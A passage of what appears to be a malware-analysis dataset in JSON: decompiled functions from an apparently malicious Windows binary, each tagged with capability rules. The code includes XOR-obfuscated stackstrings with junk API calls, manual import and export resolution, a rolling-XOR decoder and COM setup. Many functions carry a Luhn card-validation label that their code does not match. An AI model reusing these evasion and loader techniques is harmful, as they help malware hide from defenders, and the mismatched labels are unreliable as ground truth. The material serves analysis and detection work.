(*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    }\n    return puVar5;\n}\n",
        "token_count": 342
    },
    "0040907b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040907b(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint s2;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar2 = 0;\n    var_8h = 0;\n    uVar1 = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = param_2;\n    if (0 < param_2) {\n        do {\n            if (0x3ff < uVar1) {\n                sub.ntdll.dll_memcpy(iVar2 + param_1, &s2, uVar1);\n                iVar2 = iVar2 + uVar1;\n                uVar1 = 0;\n            }\n            *(&s2 + uVar1) = *(var_8h + param_1) ^ var_1h;\n            uVar1 = uVar1 + 1;\n            var_1h._0_1_ = var_1h + (var_8h % 0x85) * '\\x03';\n            var_8h = var_8h + 1;\n        } while (var_8h < var_ch);\n        if (uVar1 != 0) {\n            sub.ntdll.dll_memcpy(iVar2 + param_1, &s2, uVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 351
    },
    "004092e6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004092e6(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(param_1 + 0x3c);\n    if (*(iVar1 + 4 + param_1) == -0x799c) {\n        iVar1 = *(iVar1 + 0x88 + param_1);\n    }\n    else {\n        iVar1 = *(iVar1 + 0x78 + param_1);\n    }\n    return iVar1 + param_1;\n}\n",
        "token_count": 116
    },
    "00409305": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00409305(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint16_t *puVar5;\n    uint var_14h;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.004092e6();\n    if (((iVar3 != 0) && (iVar1 = *(iVar3 + 0x1c),  iVar1 != 0)) && (*(iVar3 + 0x20) != 0)) {\n        var_8h = 0;\n        uVar2 = *(iVar3 + 0x18);\n        puVar5 = *(iVar3 + 0x24) + param_1;\n        piVar4 = *(iVar3 + 0x20) + param_1;\n        if (uVar2 != 0) {\n            do {\n                iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*piVar4 + param_1, param_2);\n                if (iVar3 == 0) {\n                    return iVar1 + param_1 + *puVar5 * 4;\n                }\n                puVar5 = puVar5 + 1;\n                piVar4 = piVar4 + 1;\n                var_8h = var_8h + 1;\n            } while (var_8h < uVar2);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 353
    },
    "0040938b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040938b(int32_t param_1, uint32_t param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    param_1 = *(param_1 + 0x3c) + param_1;\n    iVar1 = *(param_1 + 6);\n    iVar2 = param_1 + 0x18 + *(param_1 + 0x14);\n    while ((param_2 < *(iVar2 + 0xc) ||\n           ((*(param_1 + 0x3c) + -1 + *(iVar2 + 0x10) & ~(*(param_1 + 0x3c) - 1U)) + *(iVar2 + 0xc) <= param_2))) {\n        iVar1 = iVar1 + -1;\n        iVar2 = iVar2 + 0x28;\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return (*(iVar2 + 0x14) - *(iVar2 + 0xc)) + param_2;\n}\n",
        "token_count": 255
    },
    "004093f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004093f2(uint hModule, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    \n    if ((arg_ch == 0) && (arg_ch = arg_10h,  arg_10h == 0)) {\n        uVar1 = 0xc000007b;\n    }\n    else {\n        puVar3 = in_ECX + arg_ch;\n        if (puVar3 == NULL) {\n            uVar1 = 0xc000007b;\n        }\n        else {\n            uVar2 = *puVar3;\n            if (uVar2 != 0) {\n                iVar4 = (in_ECX + arg_10h) - puVar3;\n                do {\n                    if (uVar2 < 0) {\n                        uVar2 = uVar2 & 0xffff;\n                    }\n                    else {\n                        uVar2 = uVar2 + 2 + in_ECX;\n                    }\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hModule, uVar2);\n                    *(iVar4 + puVar3) = uVar1;\n                    puVar3 = puVar3 + 1;\n                    uVar2 = *puVar3;\n                } while (uVar2 != 0);\n            }\n            uVar1 = 0;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 335
    },
    "00409457": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00409457(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint lpModuleName;\n    uint phModule;\n    \n    iVar2 = *0x41cd78;\n    iVar4 = *(*(*0x41cd78 + 0x3c) + 0x80 + *0x41cd78);\n    if (iVar4 == 0) {\n        uVar3 = 0xc000000d;\n    }\n    else {\n        puVar6 = iVar4 + *0x41cd78;\n        if (puVar6 == NULL) {\n            uVar3 = 0xc000000d;\n        }\n        else {\n            iVar4 = puVar6[3];\n            while (iVar4 != 0) {\n                if (iVar4 + iVar2 != 0) {\n                    iVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(iVar4 + iVar2);\n                    if (iVar4 == 0) break;\n                    lpModuleName._0_1_ = 0;\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(iVar4, &lpModuleName, 0x104);\n                    if (iVar5 != 0) {\n                        (*_sym.imp.KERNEL32.dll_GetModuleHandleExA)(1, &lpModuleName, &phModule);\n                    }\n                    iVar4 = fcn.004093f2(iVar4, *puVar6, puVar6[4]);\n                    if (iVar4 != 0) break;\n                }\n                piVar1 = puVar6 + 8;\n                puVar6 = puVar6 + 5;\n                iVar4 = *piVar1;\n            }\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 423
    },
    "004095fb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004095fb(int16_t *param_1, uint param_2)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint lpUrlComponents;\n    uint s;\n    uint var_2ch;\n    uint var_28h;\n    \n    sub.ntdll.dll_memset(&s, 0, 0x38);\n    lpUrlComponents = 0x3c;\n    var_28h = 0x104;\n    piVar3 = param_1;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n    } while (iVar1 != 0);\n    var_2ch = param_2;\n    iVar2 = (*_sym.imp.WINHTTP.dll_WinHttpCrackUrl)(param_1, piVar3 - (param_1 + 1) >> 1, 0, &lpUrlComponents);\n    return iVar2 != 0;\n}\n",
        "token_count": 221
    },
    "0040ac08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040ac08(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint hModule;\n    uint var_4h;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        iVar6 = 0x104;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameW)(param_1, iVar3, iVar6);\n            pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if ((iVar4 == 0) || (iVar6 != iVar4)) break;\n            iVar6 = iVar6 + 0x104;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            uVar2 = (*pcVar1)(0, iVar6 * 2);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        } while (iVar3 != 0);\n        if (iVar3 != 0) {\n            if (iVar4 != 0) {\n                *param_2 = iVar3;\n                return 0;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar2;\n        }\n    }\n    return 8;\n}\n",
        "token_count": 424
    },
    "0040ad62": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.0040ad62(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint nNumberOfBytesToWrite;\n    code *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t lpString2;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar5 = 8;\n    var_ch = 8;\n    lpString2 = param_1;\n    var_18h = (*_sym.imp.KERNEL32.dll_lstrlenW)(param_1);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (param_1 != 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_18h * 2 + 0x1a);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (iVar2 != 0) {\n            var_10h = iVar2;\n            uVar1 = (*pcVar4)(0, var_18h * 2 + 6);\n            var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            if (var_4h != 0) {\n                (*_sym.imp.KERNEL32.dll_lstrcpyW)(iVar2, lpString2);\n                var_20h = (*_sym.imp.ntdll.dll_wcsrchr)(iVar2, 0x5c);\n                var_20h = var_20h + 2;\n                var_38h = 0x530d534b;\n                var_34h = 0x53407526;\n                var_30h = 0x75325303;\n                var_2ch = 0x5361531a;\n                var_28h = 0x5361536e;\n                var_24h._0_2_ = 0x7553;\n                fcn.00401000(0x20);\n                iVar5 = var_18h;\n                iVar6 = 0;\n                iVar2 = &var_38h - var_18h;\n                do {\n                    iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcessorNumber)();\n                    if (iVar3 != 0x4df1dc) {\n                        var_1ch = 6;\n                        *(iVar6 + iVar5) = *(&var_28h + iVar6 % 6) ^ (iVar6 + iVar5)[iVar2];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x10);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                pcVar4 = _sym.imp.USER32.dll_wsprintfW;\n                (*_sym.imp.USER32.dll_wsprintfW)(var_20h, iVar5, uVar1);\n                (*pcVar4)(var_4h, 0x40fb50, lpString2);\n                pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x104);\n                lpString2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                if (lpString2 != 0) {\n                    var_1ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                    var_80h = 0x150d032a;\n                    var_7ch = 0x54572933;\n                    var_78h = 0x4667a15;\n                    var_74h = 0x6b324a59;\n                    var_70h = 0x57565c52;\n                    var_6ch = 0x125c4d41;\n                    var_68h = 0x1c134157;\n                    var_64h = 0x526e7a0b;\n                    var_60h = 0x22506a48;\n                    var_5ch = 0x22025911;\n                    var_58h = 0x470d0422;\n                    var_54h = 0x59466e7f;\n                    var_50h = 0x183f3500;\n                    var_4ch = 0x462f4259;\n                    var_48h = 0x36021d7d;\n                    var_44h = 0x575c526b;\n                    var_40h._0_2_ = 0x4157;\n                    var_40h._2_1_ = 0x77;\n                    var_ch = 0x6779774b;\n                    var_8h._0_1_ = 0x5a;\n                    fcn.00401000(0x43);\n                    iVar2 = var_20h;\n                    iVar6 = 0;\n                    iVar5 = &var_80h - var_20h;\n                    do {\n                        iVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                        if (iVar3 != 0x2031a7) {\n                            var_20h = 5;\n                            *(iVar6 + iVar2) = *(&var_ch + iVar6 % 5) ^ (iVar6 + iVar2)[iVar5];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0x43);\n                    uVar1 = var_1ch;\n                    nNumberOfBytesToWrite = (*_sym.imp.USER32.dll_wsprintfA)(lpString2, iVar2, var_1ch, var_1ch);\n                    var_ch = fcn.004067bf(nNumberOfBytesToWrite);\n                    iVar5 = var_18h;\n                    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    if (var_ch == 0) {\n                        var_ch = fcn.0040acb9(uVar1);\n                    }\n                    uVar1 = (*pcVar4)(0, lpString2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    uVar1 = (*pcVar4)(0, iVar2);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                }\n                uVar1 = (*pcVar4)(0, var_4h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*pcVar4)(0, iVar5);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                iVar5 = var_ch;\n                iVar2 = var_10h;\n            }\n            uVar1 = (*pcVar4)(0, iVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 1703
    },
    "0040b955": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040b955(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint s2;\n    int32_t var_8h;\n    uint var_1h;\n    \n    iVar2 = 0;\n    uVar1 = 0;\n    var_1h._0_1_ = 0x22;\n    var_8h = 0;\n    do {\n        if (0x3ff < uVar1) {\n            sub.ntdll.dll_memcpy(iVar2 + param_1, &s2, uVar1);\n            iVar2 = iVar2 + uVar1;\n            uVar1 = 0;\n        }\n        *(&s2 + uVar1) = *(var_8h + param_1) ^ var_1h;\n        uVar1 = uVar1 + 1;\n        var_1h._0_1_ = var_1h + (var_8h % 0x85) * '\\x03';\n        var_8h = var_8h + 1;\n    } while (var_8h < 0x184);\n    if (uVar1 != 0) {\n        sub.ntdll.dll_memcpy(iVar2 + param_1, &s2, uVar1);\n    }\n    return;\n}\n",
        "token_count": 319
    },
    "0040c4db": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.0040c4db(uint noname_0, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *arg_8h;\n    uint extraout_ECX;\n    int32_t in_EDX;\n    uint uVar4;\n    uint unaff_EDI;\n    int32_t *piVar5;\n    int32_t *piStack332;\n    int32_t *piStack328;\n    int32_t *piStack324;\n    int32_t *piStack320;\n    int32_t *piStack316;\n    int32_t iStack312;\n    int32_t *piStack308;\n    int32_t *piStack304;\n    int32_t *piStack300;\n    uchar *puStack296;\n    uchar *puStack292;\n    int32_t *piStack288;\n    uint uStack284;\n    uint uStack268;\n    uint uStack264;\n    int32_t iStack260;\n    uint uStack256;\n    uint uStack252;\n    uint uStack248;\n    uint uStack244;\n    uint uStack240;\n    uint uStack236;\n    uint uStack232;\n    uint uStack228;\n    int32_t iStack224;\n    uchar *puStack220;\n    uchar *puStack216;\n    uchar *puStack212;\n    uchar *puStack208;\n    int32_t *piStack204;\n    uint uStack200;\n    uint uStack196;\n    uint uStack192;\n    uint uStack188;\n    uint uStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    int32_t iStack168;\n    uint uStack164;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    int32_t iStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    int32_t iStack76;\n    uint uStack72;\n    uint uStack68;\n    \n    uVar4 = 0;\n    uStack164 = 0;\n    iStack168 = 0;\n    uStack128 = 0;\n    uStack172 = 0x40c500;\n    iStack124 = in_EDX;\n    iVar2 = (*_sym.imp.ole32.dll_CoInitializeEx)();\n    if (-1 < iVar2) {\n        uStack172 = 0;\n        uStack176 = 0;\n        uStack180 = 0;\n        uStack184 = 3;\n        uStack188 = 6;\n        uStack192 = 0;\n        uStack196 = 0;\n        uStack200 = 0xffffffff;\n        piStack204 = NULL;\n        puStack208 = 0x40c51a;\n        iVar2 = (*_sym.imp.ole32.dll_CoInitializeSecurity)();\n        if (-1 < iVar2) {\n            puStack208 = &stack0xffffff44;\n            uStack188 = 0;\n            puStack212 = 0x40f420;\n            puStack216 = 0x1;\n            puStack220 = NULL;\n            iStack224 = 0x40f630;\n            uStack228 = 0x40c53e;\n            iVar2 = (*_sym.imp.ole32.dll_CoCreateInstance)();\n            pcVar1 = _sym.imp.OLEAUT32.dll_VariantClear;\n            if (-1 < iVar2) {\n                puStack208 = &stack0xffffff5c;\n                puStack212 = 0x40c553;\n                (*_sym.imp.OLEAUT32.dll_VariantClear)();\n                iStack104 = iStack168;\n                puStack212 = &stack0xffffff78;\n                uStack100 = uStack164;\n                puStack216 = 0x40c566;\n                uStack96 = unaff_EDI;\n                (*pcVar1)();\n                uStack92 = uStack140;\n                puStack216 = &stack0xffffff84;\n                uStack88 = uStack136;\n                uStack84 = uStack132;\n                uStack80 = uStack128;\n                puStack220 = 0x40c579;\n                (*pcVar1)();\n                uStack80 = uStack128;\n                puStack220 = &stack0xffffff60;\n                iStack76 = iStack124;\n                uStack72 = uStack120;\n                uStack68 = uStack116;\n                iStack224 = 0x40c58f;\n                (*pcVar1)();\n                uStack236 = uStack116;\n                uStack232 = uStack112;\n                uStack228 = uStack108;\n                iStack224 = iStack104;\n                uStack252 = uStack100;\n                uStack248 = uStack96;\n                uStack244 = uStack92;\n                uStack240 = uStack88;\n                uStack268 = uStack84;\n                uStack264 = uStack80;\n                iStack260 = iStack76;\n                uStack256 = uStack72;\n                piStack288 = piStack204;\n                uStack284 = uStack164;\n                puStack292 = 0x40c5d3;\n                iVar2 = (**(*piStack204 + 0x28))();\n                pcVar1 = _sym.imp.OLEAUT32.dll_VariantCopy;\n                puStack292 = &stack0xffffff18;\n                puStack296 = 0x40c5e2;\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)();\n                puStack296 = &stack0xffffff34;\n                piStack300 = 0x40c5e9;\n                (*pcVar1)();\n                piStack300 = &stack0xffffff20;\n                piStack304 = 0x40c5f0;\n                (*pcVar1)();\n                piStack304 = &stack0xfffffefc;\n                piStack308 = 0x40c5f7;\n                (*pcVar1)();\n                pcVar1 = _sym.imp.OLEAUT32.dll_SysReAllocString;\n                if (-1 < iVar2) {\n                    piStack308 = 0x40fb3c;\n                    iStack312 = 0x40c60c;\n                    iVar2 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n                    if (iVar2 != 0) {\n                        piStack308 = &stack0xfffffee4;\n                        uStack284 = 0;\n                        piStack316 = piStack288;\n                        piStack320 = 0x40c62c;\n                        iStack312 = iVar2;\n                        iVar3 = (**(*piStack288 + 0x1c))();\n                        if (-1 < iVar3) {\n                            piStack320 = piStack304;\n                            piStack324 = 0x40c63a;\n                            arg_8h = (*pcVar1)();\n                            if (arg_8h != NULL) {\n                                piStack324 = NULL;\n                                piStack332 = piStack300;\n                                piStack328 = arg_8h;\n                                (**(*piStack300 + 0x3c))();\n                                piStack308 = NULL;\n                                iVar3 = (**(*piStack316 + 0x24))(piStack316);\n                                if (-1 < iVar3) {\n                                    piStack332 = NULL;\n                                    piVar5 = piStack320;\n                                    iVar3 = (**(*piStack320 + 0x24))(piStack320, &stack0xfffffeb4);\n                                    if (-1 < iVar3) {\n                                        piStack324 = NULL;\n                                        iVar3 = (**(_pe_dos_header + 0x28))(0, 9, &stack0xfffffebc);\n                                        if (-1 < iVar3) {\n                                            iVar3 = fcn.0040c145(extraout_ECX);\n                                            if (iVar3 != 0) {\n                                                piStack332 = fcn.0040c19a(arg_8h, piStack328, arg_ch);\n                                            }\n                                            (**(piStack308 + 8))(&stack0xfffffecc);\n                                        }\n                                        (**(*piVar5 + 8))(piVar5);\n                                    }\n                                    (**(*piStack328 + 8))(piStack328);\n                                }\n                                (*_sym.imp.OLEAUT32.dll_SysStringLen)(arg_8h);\n                            }\n                            piStack324 = piStack300;\n                            piStack328 = 0x40c6f2;\n                            (**(*piStack300 + 8))();\n                        }\n                        piStack324 = 0x40c6f9;\n                        piStack320 = iVar2;\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)();\n                    }\n                }\n                piStack308 = piStack288;\n                iStack312 = 0x40c703;\n                (**(*piStack288 + 8))();\n                uVar4 = uStack172;\n            }\n        }\n        puStack208 = 0x40c70d;\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return uVar4;\n}\n",
        "token_count": 2006
    },
    "0040484b": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "query environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040484b(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    uint lpString;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0x2b50350b;\n    var_10h = 0x470d0418;\n    var_ch = 0x48314768;\n    puVar6 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    var_8h._0_2_ = 0x6973;\n    var_18h = 0;\n    fcn.00401000(8);\n    iVar4 = var_4h;\n    iVar7 = 0;\n    iVar2 = &var_14h - var_4h;\n    do {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        if (iVar1 != 0xab87cf) {\n            var_4h = 6;\n            *(iVar7 + iVar4) = *(&var_ch + iVar7 % 6) ^ (iVar7 + iVar4)[iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 8);\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(iVar4, &lpString, 0x104);\n    uVar5 = var_18h;\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        iVar2 = fcn.00403920();\n        if (iVar2 == -0x69b4c9f2) {\n            uVar5 = 1;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar5;\n}\n",
        "token_count": 530
    },
    "004099a8": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004099a8(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_24h;\n    uint var_20h;\n    uchar var_1bh;\n    uchar var_1ah;\n    uint var_19h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_24h = 0x441e3f3f;\n    var_20h._0_2_ = 0x940;\n    var_ch = 5;\n    var_20h._2_1_ = 5;\n    stack0xffffffdf = 0x1907;\n    var_1bh = 0x55;\n    var_1ah = 0x47;\n    var_19h._0_1_ = 0x11;\n    var_19h._1_1_ = 0x69;\n    var_14h = 0x306c5669;\n    var_10h._0_2_ = 0x6835;\n    fcn.00401000(0xd);\n    iVar3 = var_4h;\n    iVar7 = 0;\n    var_8h = 6;\n    iVar6 = &var_24h - var_4h;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar4 != 0xc03dac) {\n            *(iVar7 + iVar3) = *(&var_14h + iVar7 % var_8h) ^ (iVar7 + iVar3)[iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    var_20h._2_1_ = 5;\n    var_24h = 0x291d533c;\n    var_20h._0_2_ = 0x3b07;\n    stack0xffffffdf = 0x695d;\n    var_1bh = 6;\n    var_1ah = 0x3b;\n    var_19h._0_1_ = 0x5a;\n    var_19h._1_1_ = 0x6f;\n    var_14h = 0x476f3657;\n    var_10h._0_2_ = CONCAT11(var_10h._1_1_, 0x62);\n    fcn.00401000(0xd);\n    iVar3 = var_8h;\n    iVar7 = 0;\n    iVar6 = &var_24h - var_8h;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar4 != 0x46b089) {\n            *(iVar7 + iVar3) = *(&var_14h + iVar7 % var_ch) ^ (iVar7 + iVar3)[iVar6];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xd);\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar3, var_4h);\n    *0x41cde4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar5);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    uVar5 = (*pcVar2)(0, var_4h);\n    (*pcVar1)(uVar5);\n    return;\n}\n",
        "token_count": 871
    },
    "0040bb2f": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0040bb2f(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_27h;\n    uint var_20h;\n    uint *var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint hObject;\n    int32_t StringSid;\n    uint dwBytes;\n    \n    iVar5 = 0;\n    dwBytes = 0;\n    hObject = 0;\n    StringSid = 0;\n    var_18h = 0;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &hObject);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar3 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(hObject, 1, 0, dwBytes, &dwBytes);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar3 == 0x7a) &&\n           (puVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, dwBytes),  var_1ch = puVar4,  puVar4 != NULL)) {\n            iVar3 = (*pcVar1)(hObject, 1, puVar4, dwBytes, &dwBytes);\n            if ((iVar3 != 0) &&\n               ((iVar3 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*puVar4, &StringSid),  iVar3 != 0 &&\n                (StringSid != 0)))) {\n                var_38h = 0x43196c1e;\n                var_34h = 0x34414d45;\n                var_30h = 0x6c607476;\n                var_14h = 5;\n                var_2ch._0_1_ = 5;\n                stack0xffffffd1 = 0x6c4d4c43;\n                var_27h._0_1_ = 